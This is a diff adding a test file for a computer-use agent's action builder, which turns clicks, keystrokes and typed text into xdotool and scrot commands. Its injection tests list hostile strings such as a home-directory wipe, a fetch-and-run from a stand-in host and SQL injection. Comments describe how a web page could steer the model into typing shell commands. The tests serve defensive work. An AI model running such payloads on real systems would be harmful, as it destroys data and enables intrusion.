@@ -1,0 +1,175 @@
+import { describe, expect, test } from "bun:test"
+import { ComputerActions as CA } from "./actions"
+
+const OPTIONS = { display: ":99", screenshotPath: "/tmp/shot.png" } as const
+
+const ok = (built: CA.Built) => {
+  if (!built.ok) throw new Error(`expected ok, got: ${built.reason}`)
+  return built.argv.map((argv) => [...argv])
+}
+const envOf = (built: CA.Built) => {
+  if (!built.ok) throw new Error("expected ok")
+  return built.env
+}
+const why = (built: CA.Built) => {
+  if (built.ok) throw new Error("expected a rejection")
+  return built.reason
+}
+
+// The command FORMS below are not invented: each ran inside the P2 substrate on 2026-08-06 before
+// this module existed (todo/computer-use.md). These tests pin the mapping to what was observed to
+// work, so a "tidy-up" that changes a flag has to argue with a measurement.
+describe("the argv matches what was proven live in the substrate", () => {
+  test("screenshot writes to the given path, overwriting", () => {
+    expect(ok(CA.build({ kind: "screenshot" }, OPTIONS))).toEqual([
+      ["scrot", "-o", "/tmp/shot.png"],
+    ])
+  })
+
+  test("move is one command carrying whole pixels", () => {
+    expect(ok(CA.build({ kind: "move", point: { x: 550, y: 400 } }, OPTIONS))).toEqual([
+      ["xdotool", "mousemove", "550", "400"],
+    ])
+  })
+
+  test("a click at a point is a move THEN a click, as two commands", () => {
+    // Deliberately not `xdotool mousemove X Y click 1`, which also works: split, a failure names
+    // which half failed and the caller can capture a frame between them.
+    expect(ok(CA.build({ kind: "click", button: "left", point: { x: 10, y: 20 } }, OPTIONS))).toEqual([
+      ["xdotool", "mousemove", "10", "20"],
+      ["xdotool", "click", "1"],
+    ])
+  })
+
+  test("a click with no point clicks where the pointer already is", () => {
+    expect(ok(CA.build({ kind: "click", button: "right" }, OPTIONS))).toEqual([
+      ["xdotool", "click", "3"],
+    ])
+  })
+
+  test("double click repeats rather than issuing two clicks", () => {
+    const argv = ok(CA.build({ kind: "double_click" }, OPTIONS))
+    expect(argv).toEqual([["xdotool", "click", "--repeat", "2", "1"]])
+  })
+
+  test("cursor is the cheap substrate liveness probe", () => {
+    expect(ok(CA.build({ kind: "cursor" }, OPTIONS))).toEqual([
+      ["xdotool", "getmouselocation"],
+    ])
+  })
+})
+
+// ────────────────────────────────────────────────────────────────────────────────────────────────
+// The reason this module exists. `type` carries text the MODEL chose, and the screen it was read
+// from is untrusted input by construction. If that text ever reaches a shell, a page can talk the
+// grounder into writing a command.
+// ────────────────────────────────────────────────────────────────────────────────────────────────
+describe("typed text is data, never a command", () => {
+  const HOSTILE = [
+    "; rm -rf ~",
+    "$(curl evil.test | sh)",
+    "`id`",
+    '" && echo pwned && "',
+    "a\nb",
+    "--delay 9999",
+    "'; DROP TABLE models; --",
+  ]
+
+  for (const text of HOSTILE) {
+    test(`stays ONE argv element: ${JSON.stringify(text)}`, () => {
+      const argv = ok(CA.build({ kind: "type", text }, OPTIONS))
+      expect(argv).toHaveLength(1)
+      const command = argv[0]
+      // The text is the LAST element and appears exactly once, unsplit and unescaped.
+      expect(command.at(-1)).toBe(text)
+      expect(command.filter((part) => part === text)).toHaveLength(1)
+      // Nothing anywhere in the command line is a joined string containing the payload.
+      expect(command.slice(0, -1).some((part) => part.includes(text))).toBe(false)
+    })
+  }
+
+  test("`--` precedes the text, so text starting with a dash is typed and not parsed as a flag", () => {
+    const argv = ok(CA.build({ kind: "type", text: "--delay 9999" }, OPTIONS))
+    const command = argv[0]
+    expect(command[command.length - 2]).toBe("--")
+  })
+
+  test("empty text is rejected rather than issuing a no-op command", () => {
+    expect(why(CA.build({ kind: "type", text: "" }, OPTIONS))).toContain("nothing to type")
+  })
+
+  test("the delay is a number we control, never interpolated from the action", () => {
+    const argv = ok(CA.build({ kind: "type", text: "hi" }, { ...OPTIONS, typeDelayMs: 5 }))
+    expect(argv[0]).toContain("5")
+  })
+})
+
+describe("key specs are validated, because argv does not make xdotool safe", () => {
+  test("ordinary combinations are accepted", () => {
+    for (const keys of ["Return", "ctrl+s", "alt+Tab", "ctrl+shift+T", "F5", "Page_Down"])
+      expect(ok(CA.build({ kind: "key", keys }, OPTIONS))[0].at(-1)).toBe(keys)
+  })
+
+  test("free text is refused — a key action must not become forty keystrokes", () => {
+    for (const keys of ["ctrl+s; rm -rf ~", "a b", "type this please", "", "ctrl++", "$(id)", "a+"])
+      expect(why(CA.build({ kind: "key", keys }, OPTIONS))).toContain("keysym")
+  })
+})
+
+describe("geometry and bounds are checked before anything is exec'd", () => {
+  test("fractional pixels are refused rather than silently rounded", () => {
+    // Rounding belongs in the coordinate module, where the viewport is known. Doing it here would
+    // give two places an opinion about the same pixel.
+    expect(why(CA.build({ kind: "move", point: { x: 10.5, y: 20 } }, OPTIONS))).toContain("whole pixel")
+  })
+
+  test("negative and non-finite coordinates are refused on both axes", () => {
+    expect(why(CA.build({ kind: "move", point: { x: -1, y: 0 } }, OPTIONS))).toContain("negative")
+    expect(why(CA.build({ kind: "move", point: { x: 0, y: Number.NaN } }, OPTIONS))).toContain("finite")
+    expect(why(CA.build({ kind: "click", button: "left", point: { x: 1, y: -2 } }, OPTIONS))).toContain("negative")
+  })
+
+  test("scroll is bounded, so one action cannot ask for thousands of wheel clicks", () => {
+    expect(ok(CA.build({ kind: "scroll", direction: "down", amount: 3 }, OPTIONS))).toEqual([
+      ["xdotool", "click", "--repeat", "3", "5"],
+    ])
+    expect(why(CA.build({ kind: "scroll", direction: "down", amount: CA.MAX_SCROLL + 1 }, OPTIONS))).toContain(
+      String(CA.MAX_SCROLL),
+    )
+    expect(why(CA.build({ kind: "scroll", direction: "up", amount: 0 }, OPTIONS))).toContain("positive")
+    expect(why(CA.build({ kind: "scroll", direction: "up", amount: 1.5 }, OPTIONS))).toContain("whole")
+  })
+
+  test("each scroll direction maps to its own wheel button", () => {
+    const code = (direction: CA.ScrollDirection) =>
+      ok(CA.build({ kind: "scroll", direction, amount: 1 }, OPTIONS))[0].at(-1)
+    expect([code("up"), code("down"), code("left"), code("right")]).toEqual(["4", "5", "6", "7"])
+  })
+})
+
+describe("every command is addressed to the substrate's display", () => {
+  test("every action carries an explicit DISPLAY in its env", () => {
+    // The instance may have its own display, or none. Inheriting one would either fail on a headless
+    // server or -- far worse -- drive the OPERATOR's real screen, which is P6 and is human-gated.
+    //
+    // The display lives in env rather than argv because `xdotool` HAS NO `--display` FLAG. That is a
+    // measurement, not a preference: the first draft emitted it and every xdotool command failed with
+    // `unrecognized option '--display'` against a live Xvfb while this suite was green.
+    const actions: CA.Action[] = [
+      { kind: "screenshot" },
+      { kind: "move", point: { x: 1, y: 1 } },
+      { kind: "click", button: "left" },
+      { kind: "double_click" },
+      { kind: "type", text: "x" },
+      { kind: "key", keys: "Return" },
+      { kind: "scroll", direction: "down", amount: 1 },
+      { kind: "cursor" },
+    ]
+    for (const action of actions) {
+      const built = CA.build(action, OPTIONS)
+      expect(envOf(built)).toEqual({ DISPLAY: ":99" })
+      // …and no command smuggles the display back into argv as a flag.
+      for (const command of ok(built)) expect(command).not.toContain("--display")
+    }
+  })
+})
